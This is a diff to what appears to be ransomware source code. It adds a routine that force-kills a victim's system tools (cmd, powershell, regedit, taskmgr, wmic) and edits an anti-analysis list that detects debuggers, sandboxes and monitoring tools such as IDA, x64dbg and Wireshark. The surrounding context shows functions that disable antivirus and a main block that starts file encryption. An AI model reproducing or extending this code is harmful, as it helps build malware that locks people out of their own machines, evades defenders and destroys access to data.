@@ -599,6 +599,14 @@ def disable_AV():
 
 
 def disable_all():
+    black_list = [
+        "cmd", "powershell", "regedit", "msconfig", 
+        "taskmgr", "perfmon", "services", "netstat", "wmic",
+    ]
+    for proc in black_list:
+        execute_command(
+            f'taskkill /f /im "{(proc + ".exe") if not proc.endswith(".dll") else proc}" /t'
+        )
     disable_regedit()
     disable_powershell()
     disable_recovery()
@@ -628,11 +636,11 @@ def is_vm():
     ]
     ඞ_procs = [ # sus processes ඞ
         "Dbgview", "ILSpy", "ProcessHacker", "SbieCtrl", "SbieSvc", "SecurityHealthSystray", "WMIADAP", "autoruns", "autorunsc",
-        "BurpSuite", "Cain", "CarbonBlack", "cb", "cmd", "Decoder", "dnSpy", "eventvwr", "Fiddler", "frida-server", "gdb", "gmer",
+        "BurpSuite", "Cain", "CarbonBlack", "cb", "Decoder", "dnSpy", "eventvwr", "Fiddler", "frida-server", "gdb", "gmer",
         "HookExplorer", "HttpAnalyzerV7", "HttpDebuggerUI", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idaw", "x64dbg",
-        "idaw64", "ImmunityDebugger", "ksdumper", "msconfig", "netmon", "netstat", "ollydbg", "perfmon", "powershell", "ProcessHacker",
-        "procexp", "procexp64", "procmon", "regedit", "regmon", "regripper", "Sandboxie", "schtasks", "services", "smartscreen",
-        "sxutil", "sysmon", "tasklist", "taskmgr", "tcpview", "VBoxService", "Wireshark", "Windasm", "windbg", "wmic", "x32dbg",
+        "idaw64", "ImmunityDebugger", "ksdumper", "netmon", "ollydbg", "ProcessHacker",
+        "procexp", "procexp64", "procmon", "regmon", "regripper", "Sandboxie", "schtasks", "smartscreen",
+        "sxutil", "sysmon", "tasklist", "tcpview", "VBoxService", "Wireshark", "Windasm", "windbg", "x32dbg",
     ]
     try:
         output = subprocess.check_output(
@@ -815,4 +823,5 @@ if __name__ == "__main__":
         shutdown()
     else:
         start_encryption()
+
 
